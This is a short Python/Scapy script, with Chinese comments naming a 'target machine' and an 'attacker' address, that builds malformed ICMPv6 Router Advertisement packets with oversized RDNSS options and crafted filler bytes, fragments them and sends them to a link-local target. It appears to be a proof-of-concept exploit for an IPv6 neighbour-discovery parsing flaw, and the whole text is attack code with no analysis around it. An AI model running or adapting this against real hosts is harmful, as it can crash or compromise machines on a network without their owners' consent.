from scapy.all import *
from scapy.layers.inet6 import ICMPv6NDOptEFA, ICMPv6NDOptRDNSS, ICMPv6ND_RA, IPv6, IPv6ExtHdrFragment, fragment6

v6_dst = "fe80::7c99:8fe6:170e:54cb%12" #根据上面的修改为目标机的ipv6地址 或者 临时ipv6地址
v6_src = "fe80::2146:ba20:3645:b9c6%12"             #攻击者的本地ipv6地址

p_test_half = 'A'.encode()*8 + b"\x18\x30" + b"\xFF\x18"
p_test = p_test_half + 'A'.encode()*4

c = ICMPv6NDOptEFA()

e = ICMPv6NDOptRDNSS()
e.len = 21
e.dns = [
"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA" ]
aaa = ICMPv6NDOptRDNSS()
aaa.len = 8
pkt = ICMPv6ND_RA() / aaa / \
      Raw(load='A'.encode()*16*2 + p_test_half + b"\x18\xa0"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e

p_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=255)/ \
              IPv6ExtHdrFragment()/pkt

l=fragment6(p_test_frag, 200)

for p in l:
    send(p)
